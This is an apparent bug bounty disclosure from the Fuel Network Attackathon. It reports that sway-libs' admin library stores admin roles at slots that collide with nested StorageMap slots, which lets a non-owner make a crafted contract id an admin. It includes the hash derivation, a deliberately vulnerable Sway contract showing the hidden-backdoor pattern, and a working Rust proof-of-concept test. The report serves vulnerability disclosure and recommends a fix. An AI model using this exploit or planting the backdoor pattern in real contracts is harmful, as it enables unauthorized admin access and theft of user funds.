# Attackathon \_ Fuel Network 32854 - \[Smart Contract - Low] Sway-libstd-libcompiler Storage collision

Submitted on Fri Jul 05 2024 01:14:46 GMT-0400 (Atlantic Standard Time) by @LonelySloth for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32854

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/FuelLabs/sway-libs/tree/0f47d33d6e5da25f782fc117d4be15b7b12d291b>

Impacts:

* Adding malicious addresses as admins without ownership of contract
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Ability to craft contracts with hidden backdoors

## Description

## Brief/Intro

The way storage slots are determined by the `admin` library in `sway-libs` is such that it conflicts with the slots used by the compiler for storage variables and the standard lib for `StorageMap`. The end result is that depending on the structure of the contract, it's possible for a malicious user to obtain the `admin` role, without approval form the owner, by executing other, harmless operations in the contract -- allowing the attacker to become administrator and likely steal funds. The issue might happen inadvertently in legitimate contracts, or might be exploited to create a malicious contract with a backdoor that will not be detected in an audit/review, leading to possible malicious DAO proposals, etc.

## Vulnerability Details

It is an essential security requirement for the **Sway Language** that contracts be able different data structures provided in the standard libraries, as well as primitives of the language, without fear of random, unintended interactions between them. **In particular different libraries and primitives should never produce storage collisions in contracts** (except with negligible probability as per cyrptographic security parameters).

However, the implementation of the `admin` library in `sway-libs` conflicts with the implementation of `StorageMap` in the `std-lib` -- producing storage collisions that can lead to changes in certain variables resulting in adding addresses as admin for the contract.

Let's observe how the `admin` library stores the admin role:

```
pub fn add_admin(new_admin: Identity) {
    only_owner();

    let admin_key = StorageKey::<Identity>::new(new_admin.bits(), 0, new_admin.bits());
    admin_key.write(new_admin);
}
```

**The new admin's address/contract\_id is used directly as the key to the storage slot used to store the permission.**

As a first consequence, that design decision allows the owner of the contract to set arbitrary storage locations -- regardless of the definition of ownership and what permissions an owner should have. **That in itself is serious issue and should never happen -- but we will see it gets a lot worse.**

At a first glance it might appear that the probability of an admin storage slot colliding with other regular uses of storage is small, given that *valid addresses* are generated from hashes according to strict rules, and it's unlikely any operation in the contract will result in a *valid address* gaining admin access.

**However, we will see that assumption is wrong as the operations in the generation of a `contract_id` are the same as in the generation of a `field_id` for a nested `StorageMap`**

Let's review how `contract_id` is generated:

```
contract_id = sha256(0x4655454C ++ tx.data.salt ++
    root(tx.data.witnesses[bytecodeWitnessIndex].data) ++
     root_smt(tx.storageSlots))
```

Abstracting most of the pre-image as `prefix1` we can see this definition is equivalent to:

```
contract_id = sha256( prefix1 ++ root_smt(tx.storageSlots))
```

Further, if the storage slots include a single slot, the root node is the leaf, thus:

```
contract_id = sha256( prefix1 ++ 

        sha256(0x00 ++ sha256(storage_key) ++ sha256(storage_value)))
```

Again adding a second prefix abstraction the operation is equivalent to:

```
contract_id = sha256( prefix1 ++ 
        sha256(prefix2 ++ sha256(storage_value)))
```

Now let's consider how the `field_id` (slot) for a nested `StorageMap` is calculated, let's assume the definition:

```
storage {
    my_map: StorageMap<T1, StorageMap<T2, T3> = StorageMap {},
}
```

If we work out the `field_id` slot calculations we will see the final slot used to store values is calculated as:

```
slot = sha256( key2 ++ sha256( key1 ++ sha256(storage_variable_name)))
```

*This is obviously the same operation as the generation of the contract id, as long as the prefixes and keys match, and the variable name matches the storage value.*

**That means inserting a value in such a storage map can inadvertently add a valid contract id as admin, leading to granting permissions to a malicious contract, with consequence loss of funds**

There a few conditions such a storage map must satisfy to make such an attack possible:

* The variable name "storage::namespace.variable\_name" must have exactly 32 bytes in UTF-8.
* The first key (type T1) must have exactly 33 bytes in size.
* The second key (type T2) must have exactly 68 bytes in size.
* The value type T3 must have at least 40 bytes in length (serialization size for Identity).
* There must be logic in the contract that allows a non-admin/owner to insert data in the map, with a certain level of freedom in the keys and value. However note that such freedom need not be complete as the creator of a contract has considerable control over the different parts of the "prefixes" in the generation of the contract id.

*While the existence of such a map isn't typical -- given the extreme flexibility of Sway, it can be expected with high probability that such will show up inadvertently, as thousands of contracts are developed and deployed.*

There's nothing particularly unusual with such requirements as nested storage maps are common, and composite types both as keys and values are encouraged in the documentation.

**Moreover, crafting a malicious contract with such a backdoor -- while appearing perfectly secure to auditors -- is trivial.**

If the issue isn't fixed, it can be expected that malicious contracts containing a "backdoor" for setting admins will be used as proposals for DAOs etc.

**It should not be possible that introducing a new storage variable, with any data types, even without any restrictions on writing to it, interferes with the functioning of other variables -- certainly not making anyone an admin.**

However, introducing the seemingly harmless code below in a contract creates a backdoor for setting admins:

```
storage {
    NameSpace001 {
        myDummyMap : StorageMap<(u8, u256), StorageMap<(u32, u256, u256), Identity>> = StorageMap{},
    },
}

    #[storage(read, write)]
    fn setMap(k1: (u8, u256), k2: (u32, u256, u256), val: Identity) {
        storage::NameSpace001.myDummyMap.get(k1).insert(k2, val);
    }
```

## Impact Details

The issue means adding certain storage variables to a contract can create a backdoor that allows users (without special privileges) to set valid addresses they control as admins -- which will likely result in loss of the funds.

The backdoor can be added both inadvertently in the course of development (with high probability when thousands of contracts are developed and deployed), or maliciously as a contract presented with a hidden backdoor that is undetectable to auditor unaware of this bug in the Sway libraries.

**Another important scenario is if such backdoor is introduced in libraries, leading to supply-chain attacks on multiple contracts.**

Fortunately, if the issue is fixed in `sway-libs` none of those scenarios will happen.

## Recommendation

The `admin` library should use `StorageMap` to prevent collisions with other maps, instead of using the bits of a contract id directly as storage location.

## Proof of concept

## Proof of Concept

### Vulnerable Sway Contract

```
contract;

use sway_libs::{admin::*, ownership::*, bytecode::*};

storage {
    NameSpace001 {
        myDummyMap : StorageMap<(u8, u256), StorageMap<(u32, u256, u256), Identity>> = StorageMap{},
    },
}

abi VictimContract {
    #[storage(read, write)]
    fn setMap(k2: (u8, u256), k3: (u32, u256, u256), val: Identity);

    #[storage(read, write)]
    fn is_admin_public(user: Identity) -> bool;
}

impl VictimContract for Contract {
    #[storage(read, write)]
    fn setMap(k1: (u8, u256), k2: (u32, u256, u256), val: Identity) {
        storage::NameSpace001.myDummyMap.get(k1).insert(k2, val);
    }

    #[storage(read, write)]
    fn is_admin_public(user: Identity) -> bool {
        is_admin(user)
    }
   
}
```

### Rust Test Code

```
use fuels::{prelude::*, types::ContractId};
use fuels::tx::StorageSlot;
use fuels::types::Bytes32;
use fuels::types::U256;
use fuels::crypto::Hasher;
use std::io::Write;

// Load abi from json
abigen!(Contract(
    name = "MyContract",
    abi = "out/debug/admin_examples-abi.json"
));

async fn get_contract_instance() -> (MyContract<WalletUnlocked>, ContractId) {
    // Launch a local network and deploy the contract
    let mut wallets = launch_custom_provider_and_get_wallets(
        WalletsConfig::new(
            Some(1),             /* Single wallet */
            Some(1),             /* Single coin (UTXO) */
            Some(1_000_000_000), /* Amount per coin */
        ),
        None,
        None,
    )
    .await
    .unwrap();
    let wallet = wallets.pop().unwrap();

    let id = Contract::load_from(
        "./out/debug/admin_examples.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = MyContract::new(id.clone(), wallet);

    (instance, id.into())
}

#[tokio::test]
async fn can_get_contract_id() {
    let (_instance, _id) = get_contract_instance().await;

    let field_id : Bytes32 = {
        let mut a = [0u8; 32];
        let mut buffer: &mut[u8] = &mut a;
        let s = "storage::NameSpace001.myDummyMap";
        buffer.write(s.as_bytes()).unwrap();
        a.into()
    };
    let storage_key : Bytes32 = [0x00u8; 32].into(); // any storage location

    let salt = Salt::default();

    // lets create an address that will be our attacker's admin
    let contract = Contract::load_from(
        "./out/debug/admin_examples.bin", // we can load any code for the PoC, so let's just use the same
        LoadConfiguration::default()
            .with_salt(salt)
            .with_storage_configuration(
                StorageConfiguration::default()
                    .add_slot_overrides(
                        vec![StorageSlot::new(
                        storage_key, 
                        field_id)]
                    )
            ),
    )
    .unwrap();

    let (attacker_id, code_root, state_root) = (
        contract.contract_id(),
        contract.code_root(),
        contract.state_root(),
    );

    let salt : [u8;32] = salt.into();
    let code_root : [u8;32] = code_root.into();
    // we need to use both key and data hashed for generating our
    // digests
    let storage_key : [u8;32] = Hasher::hash(storage_key).into();
    let field_id : [u8;32] = Hasher::hash(field_id).into();

    // as there's only one storage entry, the root is the hash
    // of the leaf node.
    let mut hasher = Hasher::default();
    hasher.input([0x00u8]);
    hasher.input(storage_key);
    hasher.input(field_id);
    let expected_storage_root = hasher.digest();
    // just a sanity check that we are in fact using the right storage/state root.
    assert_eq!(expected_storage_root, state_root);


    // let's also double-check address (contract id) generation.
    let mut hasher = Hasher::default();
    hasher.input([0x46, 0x55, 0x45, 0x4C]);
    hasher.input(salt);
    hasher.input(code_root);
    hasher.input(state_root);
    let expected_contract_id = hasher.digest();
    let expected_contract_id: [u8;32] = expected_contract_id.into();
    assert_eq!(ContractId::from(expected_contract_id), attacker_id);


    // Now we can generate our keys for the map
    let seed = 0x4655454Cu32;
    let first_key = (0x00u8, U256::from(storage_key));
    let second_key = (seed, 
        U256::from(salt), 
        U256::from(code_root));

    // first we set the map
    _instance
        .methods()
        .setMap(first_key, second_key, attacker_id.into())
        .with_contracts(&[&_instance])
        .call()
        .await
        .unwrap();

    // now the "attacker_id" has become an admin, without needing ownership of the contract.
    let result = _instance
        .methods()
        .is_admin_public(attacker_id.into())
        .with_contracts(&[&_instance])
        .call()
        .await
        .unwrap();

    assert_eq!(true, result.value);
}

```
